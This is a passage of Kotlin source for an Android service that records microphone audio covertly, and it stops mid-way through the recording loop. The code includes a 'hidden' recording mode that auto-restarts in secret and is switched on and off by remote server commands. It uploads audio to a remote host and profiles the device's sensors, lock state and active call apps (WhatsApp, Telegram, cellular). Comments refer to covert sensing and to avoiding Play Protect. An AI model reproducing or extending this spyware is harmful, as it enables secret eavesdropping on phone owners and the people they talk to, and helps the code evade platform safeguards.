package com.audiostream.client

import android.app.KeyguardManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.media.AudioDeviceInfo
import android.media.AudioFormat
import android.media.AudioManager
import android.media.AudioRecord
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaRecorder
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.io.RandomAccessFile
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * AudioRecordService.kt — Foreground service for continuous audio recording.
 *
 * This is the heart of the system. It:
 *   1. Records audio continuously via AudioRecord (16kHz, 16-bit, Mono)
 *   2. Splits recordings into WAV chunks (default 10 seconds)
 *   3. Saves each chunk locally with UUID, timestamp, checksum
 *   4. Enqueues chunks for upload via UploadManager
 *   5. Continues recording regardless of network/upload status
 *   6. Updates the foreground notification with live stats
 *
 * CRITICAL GUARANTEE: Recording NEVER stops due to network issues.
 * The recording loop and upload loop are completely independent.
 */

class AudioRecordService : Service() {

    companion object {
        const val ACTION_START = "ACTION_START"
        const val ACTION_START_MAIN = "ACTION_START_MAIN"
        const val ACTION_STOP_MAIN = "ACTION_STOP_MAIN"
        const val ACTION_START_HIDDEN = "ACTION_START_HIDDEN"
        const val ACTION_STOP_HIDDEN = "ACTION_STOP_HIDDEN"
        const val ACTION_STOP = "ACTION_STOP"
        const val ACTION_STANDBY = "ACTION_STANDBY"
        const val ACTION_STATE_UPDATE = "ACTION_STATE_UPDATE"
        const val ACTION_LOG = "ACTION_LOG"

        const val EXTRA_SERVER_URL = "server_url"
        const val EXTRA_PENDING = "pending"
        const val EXTRA_RETRIES = "retries"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_CONNECTION = "connection"
        const val EXTRA_IS_MAIN = "is_main"
        const val EXTRA_MESSAGE = "message"
        const val EXTRA_STORAGE = "storage"

        const val CHANNEL_ID = "audio_monitor_channel"
        const val NOTIFICATION_ID = 1

        // Audio format (must match server: 16kHz, Mono, 16-bit PCM)
        const val SAMPLE_RATE = 16000
        const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        const val BYTES_PER_SAMPLE = 2
        const val BYTE_RATE = SAMPLE_RATE * BYTES_PER_SAMPLE  // 32000 bytes/sec

        // Default chunk duration
        const val DEFAULT_CHUNK_SECONDS = 10

        // Independent stream tracking
        @Volatile
        var isMainRecording = false
            private set

        @Volatile
        var isHiddenRecording = false
            private set

        @Volatile
        var isStandbyMode = false
            private set

        val isRunning: Boolean
            get() = isMainRecording || isHiddenRecording
    }

    // Recording
    private var audioRecord: AudioRecord? = null
    private val isRecording = AtomicBoolean(false)
    private var recordingThread: Thread? = null
    private var chunkDurationSeconds = DEFAULT_CHUNK_SECONDS
    private var totalRecordingSeconds = 0L

    // Managers
    private var uploadManager: UploadManager? = null
    private var connectionMonitor: ConnectionMonitor? = null
    private var storageManager: StorageManager? = null
    private var socketManager: DeviceSocketManager? = null

    // System
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Config
    private var serverUrl = ""
    private var clientName = ""
    private var deviceInfo = ""

    // Stats for notification
    private var pendingUploads = 0
    private var totalRetries = 0
    private var connectionState = "Idle"

    // Telemetry Cache
    private var currentBatteryPct = -1
    private var currentStorageMB = -1L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) {
            // Android OS restarted the service after process termination (START_STICKY)
            val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
            val wasRunning = prefs.getBoolean("was_running", false)
            val savedUrl = prefs.getString("server_url", null)
            if (wasRunning && !savedUrl.isNullOrEmpty()) {
                // Auto-restart must ALWAYS start in hidden mode only (not main)
                startHiddenRecording(savedUrl)
            }
        } else {
            val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
            val defaultUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com") ?: ""
            val url = intent.getStringExtra(EXTRA_SERVER_URL) ?: serverUrl.ifEmpty { defaultUrl }

            when (intent.action) {
                ACTION_START_MAIN -> {
                    startMainRecording(url)
                }
                ACTION_STOP_MAIN -> {
                    stopMainRecording()
                }
                ACTION_START_HIDDEN -> {
                    startHiddenRecording(url)
                }
                ACTION_STOP_HIDDEN -> {
                    stopHiddenRecording()
                }
                ACTION_START -> {
                    val isMain = intent.getBooleanExtra(EXTRA_IS_MAIN, false)
                    if (isMain) {
                        startMainRecording(url)
                    } else {
                        startHiddenRecording(url)
                    }
                }
                ACTION_STANDBY -> {
                    startStandby(url)
                }
                ACTION_STOP -> {
                    stopAll()
                }
            }
        }
        // START_STICKY ensures Android restarts the service if killed
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopAll()
    }

    // ══════════════════════════════════════════════════════════════════════
    // SERVICE LIFECYCLE
    // ══════════════════════════════════════════════════════════════════════

    private var batteryReceiver: android.content.BroadcastReceiver? = null
    private var screenReceiver: android.content.BroadcastReceiver? = null
    private var currentPowerSource: String = "CBAT"
    private var lastChunkIsSpeech: Boolean = false
    private var lastChunkDb: Int = 0

    // Covert Environmental Sensors & Intelligence
    private var currentBatteryTempC: Int = 0
    private var isDeviceMoving: Boolean = false
    private var lastMovementTimeMs: Long = 0L
    private var isProximityNear: Boolean = false
    private var currentLux: Float = 100f
    private var currentPosture: String = "OPEN" // "POCK" (Pocket/Face-down), "DESK" (Table), "OPEN" (In hand)

    private var sensorManager: SensorManager? = null
    private var proximitySensor: Sensor? = null
    private var lightSensor: Sensor? = null
    private var accelerometerSensor: Sensor? = null
    private var sensorEventListener: SensorEventListener? = null

    private fun registerSensors() {
        try {
            sensorManager = getSystemService(Context.SENSOR_SERVICE) as? SensorManager ?: return
            proximitySensor = sensorManager?.getDefaultSensor(Sensor.TYPE_PROXIMITY)
            lightSensor = sensorManager?.getDefaultSensor(Sensor.TYPE_LIGHT)
            accelerometerSensor = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)

            sensorEventListener = object : SensorEventListener {
                override fun onSensorChanged(event: SensorEvent?) {
                    if (event == null) return
                    when (event.sensor.type) {
                        Sensor.TYPE_PROXIMITY -> {
                            val distance = event.values[0]
                            val maxRange = proximitySensor?.maximumRange ?: 5f
                            isProximityNear = distance < maxRange.coerceAtMost(5f)
                            updatePosture()
                        }
                        Sensor.TYPE_LIGHT -> {
                            currentLux = event.values[0]
                            updatePosture()
                        }
                        Sensor.TYPE_ACCELEROMETER -> {
                            val x = event.values[0]
                            val y = event.values[1]
                            val z = event.values[2]
                            val gNorm = Math.sqrt((x * x + y * y + z * z).toDouble())
                            val delta = Math.abs(gNorm - 9.81)
                            if (delta > 1.2) {
                                lastMovementTimeMs = System.currentTimeMillis()
                                isDeviceMoving = true
                            } else if (System.currentTimeMillis() - lastMovementTimeMs > 4000) {
                                isDeviceMoving = false
                            }
                            updatePosture()
                        }
                    }
                }

                override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
            }

            proximitySensor?.let { sensorManager?.registerListener(sensorEventListener, it, SensorManager.SENSOR_DELAY_NORMAL) }
            lightSensor?.let { sensorManager?.registerListener(sensorEventListener, it, SensorManager.SENSOR_DELAY_NORMAL) }
            accelerometerSensor?.let { sensorManager?.registerListener(sensorEventListener, it, SensorManager.SENSOR_DELAY_NORMAL) }
        } catch (e: Exception) {
            sendLog("Sensor listener setup error: ${e.message}")
        }
    }

    private fun updatePosture() {
        currentPosture = when {
            isProximityNear && currentLux < 10f -> "POCK"
            !isProximityNear && currentLux >= 10f && !isDeviceMoving -> "DESK"
            else -> "OPEN"
        }
    }

    private fun unregisterSensors() {
        try {
            sensorEventListener?.let { sensorManager?.unregisterListener(it) }
            sensorEventListener = null
            sensorManager = null
        } catch (e: Exception) {}
    }

    // ══════════════════════════════════════════════════════════════════
    // LAYER 1, 2, 3: CLEAN CALL & APP RESOLUTION (ZERO PLAY PROTECT RISK)
    // ══════════════════════════════════════════════════════════════════

    private var audioPlaybackCallback: AudioManager.AudioPlaybackCallback? = null
    @Volatile private var isPlaybackVoiceCall: Boolean = false
    @Volatile private var isPlaybackRingtone: Boolean = false

    private fun registerAudioPlaybackCallback() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
                audioPlaybackCallback = object : AudioManager.AudioPlaybackCallback() {
                    override fun onPlaybackConfigChanged(configs: List<android.media.AudioPlaybackConfiguration>?) {
                        super.onPlaybackConfigChanged(configs)
                        var voiceActive = false
                        var ringActive = false
                        configs?.forEach { config ->
                            val usage = config.audioAttributes.usage
                            if (usage == android.media.AudioAttributes.USAGE_VOICE_COMMUNICATION ||
                                usage == android.media.AudioAttributes.USAGE_VOICE_COMMUNICATION_SIGNALLING) {
                                voiceActive = true
                            } else if (usage == android.media.AudioAttributes.USAGE_NOTIFICATION_RINGTONE) {
                                ringActive = true
                            }
                        }
                        isPlaybackVoiceCall = voiceActive
                        isPlaybackRingtone = ringActive
                    }
                }
                am.registerAudioPlaybackCallback(audioPlaybackCallback!!, null)
            } catch (e: Exception) {
                sendLog("AudioPlaybackCallback error: ${e.message}")
            }
        }
    }

    private fun unregisterAudioPlaybackCallback() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
                audioPlaybackCallback?.let { am?.unregisterAudioPlaybackCallback(it) }
                audioPlaybackCallback = null
            } catch (e: Exception) {}
        }
    }

    private fun getForegroundAppDetails(): Pair<String, String>? {
        return try {
            val usm = getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager ?: return null
            val time = System.currentTimeMillis()
            val events = usm.queryEvents(time - 15_000L, time)
            val event = android.app.usage.UsageEvents.Event()
            var lastPkg: String? = null
            while (events.hasNextEvent()) {
                events.getNextEvent(event)
                if (event.eventType == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED) {
                    lastPkg = event.packageName
                }
            }
            if (lastPkg != null && lastPkg != packageName) {
                val label = try {
                    val appInfo = packageManager.getApplicationInfo(lastPkg, 0)
                    packageManager.getApplicationLabel(appInfo).toString()
                } catch (e: Exception) {
                    lastPkg
                }
                Pair(lastPkg, label)
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun getForegroundVoipApp(): String? {
        val details = getForegroundAppDetails() ?: return null
        return mapPackageToAppCode(details.first)
    }

    private fun mapPackageToAppCode(pkg: String): String {
        return when {
            pkg.contains("whatsapp", ignoreCase = true) -> "AWA"
            pkg.contains("instagram", ignoreCase = true) -> "AIG"
            pkg.contains("telegram", ignoreCase = true) -> "ATG"
            pkg.contains("zoom", ignoreCase = true) -> "AZOOM"
            pkg.contains("tachyon", ignoreCase = true) || pkg.contains("meet", ignoreCase = true) -> "AMEET"
            pkg.contains("skype", ignoreCase = true) -> "ASKYPE"
            pkg.contains("discord", ignoreCase = true) -> "ADISC"
            pkg.contains("orca", ignoreCase = true) || pkg.contains("messenger", ignoreCase = true) -> "AFB"
            pkg.contains("dialer", ignoreCase = true) ||
            pkg.contains("telecom", ignoreCase = true) ||
            pkg.contains("incallui", ignoreCase = true) ||
            pkg.contains("phone", ignoreCase = true) -> "ACELL"
            else -> {
                try {
                    val appInfo = packageManager.getApplicationInfo(pkg, 0)
                    val label = packageManager.getApplicationLabel(appInfo).toString()
                    val clean = label.filter { it.isLetterOrDigit() }.uppercase()
                    if (clean.isNotEmpty()) "A" + clean.take(4) else "AVOIP"
                } catch (e: Exception) {
                    "AVOIP"
                }
            }
        }
    }

    private fun getCallAppTag(): String {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
        val mode = audioManager?.mode ?: AudioManager.MODE_NORMAL

        // Layer 1: Hardware Cellular Phone Call
        if (mode == AudioManager.MODE_IN_CALL || isPhoneInCall()) {
            return "ACELL"
        }

        // Layer 1 & 2: Ringing Incoming Call
        if (mode == AudioManager.MODE_RINGTONE || isPlaybackRingtone) {
            val fgApp = getForegroundVoipApp()
            return fgApp ?: "ARING"
        }

        // Layer 1 & 2: Hardware VoIP Voice/Video Call in progress (WhatsApp, Instagram, etc.)
        if (mode == AudioManager.MODE_IN_COMMUNICATION || isPlaybackVoiceCall) {
            // Layer 3: Query UsageStatsManager to see WHICH app is active on screen!
            val fgApp = getForegroundVoipApp()
            return fgApp ?: "AVOIP"
        }

        // Layer 2: External App actively holding the microphone
        if (isMicUsedByExternalApp()) {
            val fgApp = getForegroundVoipApp()
            return fgApp ?: "AMIC"
        }

        return "AIDLE"
    }

    private fun isScreenOn(): Boolean {
        return try {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                pm?.isInteractive ?: false
            } else {
                @Suppress("DEPRECATION")
                pm?.isScreenOn ?: false
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun isDeviceUnlocked(): Boolean {
        return try {
            val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
            km?.isKeyguardLocked == false
        } catch (e: Exception) {
            false
        }
    }

    private fun getRingerMode(): String {
        return try {
            val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            when (am?.ringerMode) {
                AudioManager.RINGER_MODE_SILENT -> "RS"
                AudioManager.RINGER_MODE_VIBRATE -> "RV"
                else -> "RN"
            }
        } catch (e: Exception) {
            "RN"
        }
    }

    private fun registerScreenListener() {
        val filter = android.content.IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        screenReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                when (intent?.action) {
                    Intent.ACTION_SCREEN_ON -> sendLog("Display turned ON")
                    Intent.ACTION_SCREEN_OFF -> sendLog("Display turned OFF")
                    Intent.ACTION_USER_PRESENT -> sendLog("Device Unlocked")
                }
                sendLiveTelemetry()
            }
        }
        registerReceiver(screenReceiver, filter)
    }

    private fun sendLiveTelemetry() {
        val route = getCurrentAudioRoute()
        val callCode = getCallAppTag()
        val fgDetails = getForegroundAppDetails()
        val activePkg = fgDetails?.first ?: ""
        val activeLabel = fgDetails?.second ?: ""
        val activeAppDisplay = if (activeLabel.isNotEmpty()) activeLabel else activePkg

        val callAppName = when (callCode) {
            "AWA" -> "WhatsApp"
            "AIG" -> "Instagram"
            "ATG" -> "Telegram"
            "AZOOM" -> "Zoom"
            "AMEET" -> "Google Meet"
            "AFB" -> "Messenger"
            "ADISC" -> "Discord"
            "ASKYPE" -> "Skype"
            "ACELL" -> "Cellular Phone"
            "AVOIP" -> "VoIP Call"
            "AMIC" -> "External Mic App"
            "ARING" -> "Incoming Call Ringing"
            else -> "Idle"
        }
        socketManager?.sendTelemetry(
            batteryPct = currentBatteryPct,
            storageMb = currentStorageMB,
            route = route,
            screenOn = isScreenOn(),
            isUnlocked = isDeviceUnlocked(),
            powerSource = currentPowerSource,
            ringerMode = getRingerMode(),
            isSpeech = lastChunkIsSpeech,
            audioDb = lastChunkDb,
            batteryTemp = currentBatteryTempC,
            isMoving = isDeviceMoving,
            posture = currentPosture,
            callApp = callAppName,
            callPkg = activeAppDisplay,
            callCode = callCode
        )
    }

    private fun registerBatteryListener() {
        val filter = android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        batteryReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                intent?.let { updateBatteryFromIntent(it) }
            }
        }
        registerReceiver(batteryReceiver, filter)
    }

    private fun updateBatteryFromIntent(intent: Intent) {
        val status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)
        val isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                         status == android.os.BatteryManager.BATTERY_STATUS_FULL
        val level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
        val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
        val pct = if (level >= 0 && scale > 0) (level * 100 / scale.toFloat()).toInt() else -1
        currentBatteryPct = pct

        val plugged = intent.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1)
        currentPowerSource = when (plugged) {
            android.os.BatteryManager.BATTERY_PLUGGED_USB -> "CUSB"
            android.os.BatteryManager.BATTERY_PLUGGED_AC -> "CAC"
            android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS -> "CWIR"
            else -> "CBAT"
        }

        val rawTemp = intent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0)
        currentBatteryTempC = if (rawTemp > 0) rawTemp / 10 else 0

        val icon = if (isCharging) "⚡" else "🔋"
        val stateStr = when (currentPowerSource) {
            "CUSB" -> "USB/PC Connected"
            "CAC" -> "AC Charging"
            "CWIR" -> "Wireless Charging"
            else -> if (isCharging) "Charging" else "Discharging"
        }
        val tempStr = if (currentBatteryTempC > 0) " | ${currentBatteryTempC}°C" else ""
        val batteryStatus = if (pct >= 0) "$icon $pct% ($stateStr)$tempStr" else "$icon Unknown"
        val newDeviceInfo = "${Build.MANUFACTURER} ${Build.MODEL} | $batteryStatus"

        if (newDeviceInfo != deviceInfo) {
            deviceInfo = newDeviceInfo
            uploadManager?.updateDeviceInfo(newDeviceInfo)
        }
        sendLiveTelemetry()
    }

    private var isServiceInitialized = false

    private fun ensureServiceInitialized(url: String) {
        if (url.isNotEmpty()) {
            serverUrl = url
        }
        if (isServiceInitialized) return

        clientName = generateClientName()
        deviceInfo = "${Build.MANUFACTURER} ${Build.MODEL} | 🔋 Initializing..."

        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification("Starting..."))
        acquireWakeLock()

        storageManager = StorageManager(this)

        connectionMonitor = ConnectionMonitor(
            context = this,
            serverUrl = serverUrl,
            onStateChange = { state -> onConnectionStateChanged(state) },
            onLog = { msg -> sendLog(msg) }
        )

        uploadManager = UploadManager(
            context = this,
            serverUrl = serverUrl,
            clientName = clientName,
            deviceInfo = deviceInfo,
            connectionMonitor = connectionMonitor!!,
            storageManager = storageManager!!,
            onLog = { msg -> sendLog(msg) },
            onStatsUpdate = { pending, retries -> onUploadStatsUpdate(pending, retries) }
        )

        registerBatteryListener()
        registerScreenListener()
        registerSensors()
        registerAudioPlaybackCallback()

        socketManager = DeviceSocketManager(
            serverUrl = serverUrl,
            clientId = clientName,
            onCommandReceived = { cmd, startT, stopT ->
                handleRemoteCommand(cmd, startT, stopT)
            },
            onLog = { msg -> sendLog(msg) },
            onConnectionStateChanged = { connected ->
                if (connected) {
                    sendLiveTelemetry()
                    socketManager?.sendStatus(if (isRunning) "recording" else "idle")
                }
            }
        )
        socketManager?.start()

        storageManager!!.cleanupTempFiles()
        startNotificationUpdater()
        startCommandPolling()
        startTelemetryPolling()

        isServiceInitialized = true
    }

    private fun startMainRecording(url: String) {
        ensureServiceInitialized(url)
        isMainRecording = true
        isStandbyMode = false
        mainRecordingStartTimeMs = System.currentTimeMillis()
        connectionMonitor?.start()
        uploadManager?.start()
        startRecording()
        socketManager?.sendStatus("recording")
        updateNotification()
        broadcastStateUpdate()
        sendLog("Started Main (Local) recording.")
    }

    private fun stopMainRecording() {
        if (!isMainRecording) return
        isMainRecording = false
        sendLog("Stopped Main (Local) recording.")
        uploadManager?.endSession("main")

        if (isHiddenRecording) {
            sendLog("Covert hidden recording is still active; microphone kept recording uninterrupted.")
        } else {
            // Neither is recording -> switch to standby
            stopRecordingHardware()
            isStandbyMode = true
            socketManager?.sendStatus("idle")
            sendLog("No active recordings; switched to STANDBY (Socket live)")
        }
        updateNotification()
        broadcastStateUpdate()
    }

    private fun startHiddenRecording(url: String) {
        ensureServiceInitialized(url)
        isHiddenRecording = true
        isStandbyMode = false
        hiddenRecordingStartTimeMs = System.currentTimeMillis()
        connectionMonitor?.start()
        uploadManager?.start()
        startRecording()
        socketManager?.sendStatus("recording")
        updateNotification()
        broadcastStateUpdate()
        sendLog("Started Hidden recording.")
    }

    private fun stopHiddenRecording() {
        if (!isHiddenRecording) return
        isHiddenRecording = false
        sendLog("Stopped Hidden recording.")
        uploadManager?.endSession("hidden")

        if (isMainRecording) {
            sendLog("Main local recording is still active; microphone kept recording uninterrupted.")
        } else {
            // Neither is recording -> switch to standby
            stopRecordingHardware()
            isStandbyMode = true
            socketManager?.sendStatus("idle")
            sendLog("No active recordings; switched to STANDBY (Socket live)")
        }
        updateNotification()
        broadcastStateUpdate()
    }

    private fun startStandby(url: String) {
        ensureServiceInitialized(url)
        if (!isRunning) {
            stopRecordingHardware()
            isStandbyMode = true
            socketManager?.sendStatus("idle")
            sendLog("Standby mode active (Listening for commands)")
        }
        updateNotification()
        broadcastStateUpdate()
    }

    private fun stopAll() {
        isMainRecording = false
        isHiddenRecording = false
        isStandbyMode = false
        isPolling = false
        isServiceInitialized = false

        sendLog("Stopping entire service...")

        stopRecordingHardware()

        uploadManager?.stop()
        connectionMonitor?.stop()
        socketManager?.stop()
        socketManager = null

        try {
            batteryReceiver?.let { unregisterReceiver(it) }
            batteryReceiver = null
        } catch (e: Exception) { /* ignore */ }

        try {
            screenReceiver?.let { unregisterReceiver(it) }
            screenReceiver = null
        } catch (e: Exception) { /* ignore */ }

        unregisterSensors()
        unregisterAudioPlaybackCallback()

        releaseWakeLock()
        serviceScope.coroutineContext.cancelChildren()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()

        sendLog("Service stopped completely")
        broadcastStateUpdate()
    }

    private var isPolling = false
    private var telemetryJob: Job? = null

    private fun startTelemetryPolling() {
        telemetryJob?.cancel()
        telemetryJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                currentStorageMB = (storageManager?.getAvailableSpace() ?: 0L) / (1024 * 1024)
                sendLiveTelemetry()
                delay(60000L) // Poll every 60 seconds
            }
        }
    }

    private fun startCommandPolling() {
        if (isPolling) return
        isPolling = true
        serviceScope.launch(Dispatchers.IO) {
            val httpClient = OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .build()

            while (isPolling) {
                // If live WebSocket is connected, skip HTTP polling to conserve battery & bandwidth
                if (socketManager?.isConnected() == true) {
                    delay(15000L)
                    continue
                }

                try {
                    val encodedClientName = java.net.URLEncoder.encode(clientName, "UTF-8")
                    val status = if (isRunning) "recording" else "idle"
                    val endpoint = "${serverUrl.trimEnd('/')}/api/v1/broadcasts/command?client_id=$encodedClientName&status=$status"
                    
                    val request = Request.Builder().url(endpoint).get().build()
            
                    httpClient.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            val body = response.body?.string()
                            if (body != null) {
                                val json = JSONObject(body)
                                val command = json.optString("command", "NONE")
                                val startTime = json.optString("start_time", "")
                                val stopTime = json.optString("stop_time", "")
                                
                                syncAlarm(startTime, ACTION_START_HIDDEN, 101)
                                syncAlarm(stopTime, ACTION_STANDBY, 102)
                                
                                var processed = false
                                if (command == "START" && !isHiddenRecording) {
                                    startHiddenRecording(serverUrl)
                                    processed = true
                                } else if (command == "STOP" && isHiddenRecording) {
                                    stopHiddenRecording()
                                    processed = true
                                }
                                
                                // Acknowledge the command so the server clears it
                                if (processed) {
                                    try {
                                        val jsonBody = JSONObject().put("client_id", clientName).put("command", command).toString()
                                        val ackBody = jsonBody.toRequestBody("application/json".toMediaType())
                                        val ackRequest = Request.Builder()
                                            .url("${serverUrl.trimEnd('/')}/api/v1/broadcasts/command/ack")
                                            .post(ackBody)
                                            .build()
                                        httpClient.newCall(ackRequest).execute().close()
                                        sendLog("Command ACK sent for: $command")
                                    } catch (e: Exception) {
                                        sendLog("Failed to ACK command: ${e.message}")
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    // Ignore transient network errors
                }
                delay(15000L) // Poll every 15 seconds
            }
        }
    }

    private fun syncAlarm(timeStr: String, actionToTrigger: String, requestCode: Int) {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        val intent = Intent(this, AlarmReceiver::class.java).apply {
            action = actionToTrigger
            putExtra(AlarmReceiver.EXTRA_ACTION, actionToTrigger)
            putExtra(AlarmReceiver.EXTRA_SERVER_URL, serverUrl)
        }
        val pendingIntent = PendingIntent.getBroadcast(
            this, 
            requestCode, 
            intent, 
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        if (timeStr.isBlank()) {
            alarmManager.cancel(pendingIntent)
            return
        }

        try {
            val parts = timeStr.split(":")
            if (parts.size >= 2) {
                val cal = Calendar.getInstance().apply {
                    set(Calendar.HOUR_OF_DAY, parts[0].toInt())
                    set(Calendar.MINUTE, parts[1].toInt())
                    set(Calendar.SECOND, 0)
                    set(Calendar.MILLISECOND, 0)
                }

                if (cal.timeInMillis <= System.currentTimeMillis()) {
                    cal.add(Calendar.DAY_OF_YEAR, 1) // next occurrence
                }

                alarmManager.setExactAndAllowWhileIdle(
                    android.app.AlarmManager.RTC_WAKEUP,
                    cal.timeInMillis,
                    pendingIntent
                )
            }
        } catch (e: Exception) {
            sendLog("Error syncing alarm: ${e.message}")
        }
    }

    private fun handleRemoteCommand(command: String, startTime: String, stopTime: String) {
        if (startTime.isNotEmpty()) syncAlarm(startTime, ACTION_START_HIDDEN, 101)
        if (stopTime.isNotEmpty()) syncAlarm(stopTime, ACTION_STANDBY, 102)

        if (command == "START" && !isHiddenRecording) {
            sendLog("⚡ Executing instant START command from live socket (Hidden stream)")
            startHiddenRecording(serverUrl)
        } else if (command == "STOP" && isHiddenRecording) {
            sendLog("⚡ Executing instant STOP command from live socket (Hidden stream)")
            stopHiddenRecording()
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // AUDIO RECORDING
    // ══════════════════════════════════════════════════════════════════════

    private fun startRecording() {
        if (isRecording.get()) {
            sendLog("Microphone already active, reusing recording loop.")
            return
        }

        try {
            val minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
            val bufferSize = maxOf(minBuf, 4096)

            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                bufferSize
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                sendLog("ERROR: Failed to initialize AudioRecord. Microphone in use?")
                return
            }

            isRecording.set(true)
            audioRecord!!.startRecording()

            recordingThread = Thread({
                recordingLoop()
            }, "AudioRecordThread").apply {
                priority = Thread.MAX_PRIORITY
                start()
            }

            sendLog("Microphone hardware recording started (16kHz, Mono, 16-bit)")

        } catch (e: SecurityException) {
            sendLog("ERROR: Microphone permission denied")
        } catch (e: Exception) {
            sendLog("ERROR: Recording init failed: ${e.message}")
        }
    }

    private fun stopRecordingHardware() {
        if (!isRecording.get()) return
        isRecording.set(false)
        try {
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (e: Exception) { /* ignore */ }

        val threadToJoin = recordingThread
        recordingThread = null
        serviceScope.launch(Dispatchers.IO) {
            try {
                threadToJoin?.interrupt()
                threadToJoin?.join(1000)
            } catch (e: Exception) { /* ignore */ }
        }
        sendLog("Microphone hardware released")
    }

    /**
     * Main recording loop — runs on a dedicated thread.
     *
     * Continuously records audio and splits into WAV chunks.
     * This loop NEVER stops for network issues — it only cares
     * about the microphone and local storage.
     */
    private var mainRecordingStartTimeMs: Long = 0L
    private var hiddenRecordingStartTimeMs: Long = 0L

    private fun calculateRMS(pcmData: ByteArray, length: Int): Double {
        var sum = 0.0
        val sampleCount = length / 2
        if (sampleCount <= 0) return -100.0
        var i = 0
        while (i < length - 1) {
            val low = pcmData[i].toInt() and 0xFF
            val high = pcmData[i + 1].toInt()
            val sample = (high shl 8) or low
            val shortSample = sample.toShort()
            sum += (shortSample.toDouble() * shortSample.toDouble())
            i += 2
        }
        val rms = Math.sqrt(sum / sampleCount)
        return if (rms > 0) 20 * Math.log10(rms / 32767.0) else -100.0
    }

    private fun recordingLoop() {
        val chunkBytes = BYTE_RATE * chunkDurationSeconds  // bytes per chunk
        val readBuffer = ByteArray(4096)
        var chunkBuffer = ByteArray(chunkBytes)
        var chunkPos = 0
        var consecutiveSilentChunks = 0

        sendLog("Recording loop started (chunk size: ${chunkBytes / 1024} KB)")

        while (isRecording.get() && !Thread.interrupted()) {
            try {
                val bytesRead = audioRecord?.read(readBuffer, 0, readBuffer.size) ?: -1

                if (bytesRead > 0) {
                    // Copy bytes into chunk buffer
                    val bytesToCopy = minOf(bytesRead, chunkBytes - chunkPos)
                    System.arraycopy(readBuffer, 0, chunkBuffer, chunkPos, bytesToCopy)
                    chunkPos += bytesToCopy

                    // Check if chunk is full
                    if (chunkPos >= chunkBytes) {
                        val rmsDb = calculateRMS(chunkBuffer, chunkPos)
